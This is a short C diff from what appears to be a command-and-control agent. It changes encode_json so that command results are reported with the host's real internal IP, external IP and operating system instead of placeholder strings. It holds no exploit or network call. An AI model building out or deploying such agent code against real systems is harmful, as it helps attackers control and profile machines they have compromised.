@@ -32,6 +32,7 @@ typedef struct
     char *int_ip;
     char *ext_ip;
     char *user;
+    char *os;
 } OutboundJsonDataStruct;
 
 typedef struct
@@ -43,11 +44,11 @@ typedef struct
 } InboundJsonDataStruct;
 
 // Function declarations (fixes conflicting types issue)
-char *encode_json(const char *uuid, const char *command_result_data, const char *command_id);
+char *encode_json(const char *uuid, const char *command_result_data, const char *command_id, const char *int_ip, const char *ext_ip, const char *os);
 InboundJsonDataStruct decode_command_json(const char *json_str);
 // void free_json_data(OutboundJsonDataStruct *OutboundJsonDataStruct);
 
-char *encode_json(const char *agent_id, const char *command_result_data, const char *command_id)
+char *encode_json(const char *agent_id, const char *command_result_data, const char *command_id, const char *int_ip, const char *ext_ip, const char *os)
 /**
  * encode_json - Creates a JSON-encoded string representing the result of a command execution.
  *
@@ -95,9 +96,9 @@ char *encode_json(const char *agent_id, const char *command_result_data, const c
     }
 
     // Add metadata fields
-    cJSON_AddStringToObject(metadata, "os", "context");
-    cJSON_AddStringToObject(metadata, "ext_ip", "ext_ip");
-    cJSON_AddStringToObject(metadata, "int_ip", "int_ip");
+    cJSON_AddStringToObject(metadata, "os", os);
+    cJSON_AddStringToObject(metadata, "ext_ip", ext_ip);
+    cJSON_AddStringToObject(metadata, "int_ip", int_ip);
     cJSON_AddStringToObject(metadata, "context", "context");
 
     // Add metadata to root
